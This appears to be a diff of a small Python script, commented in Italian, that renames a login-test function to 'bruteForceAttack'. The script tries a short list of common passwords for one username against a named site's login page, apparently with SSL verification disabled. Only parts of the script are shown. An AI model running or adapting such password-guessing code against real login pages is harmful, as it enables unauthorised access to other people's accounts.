@@ -1,6 +1,6 @@
 import requests
 
-def test_login(url, username, password_list):
+def bruteForceAttack(url, username, password_list):
     for password in password_list:
         try:
             # Disabilita la verifica SSL (solo per scopi di test)
@@ -24,7 +24,7 @@ url = "https://vocari.me/login"  # Sostituisci con il tuo URL
 username = "a"
 password_list = ["12345", "admin", "password","a", "testpassword"]
 
-password_trovata = test_login(url, username, password_list)
+password_trovata = bruteForceAttack(url, username, password_list)
 
 if password_trovata:
     print(f"La password corretta è: {password_trovata}")
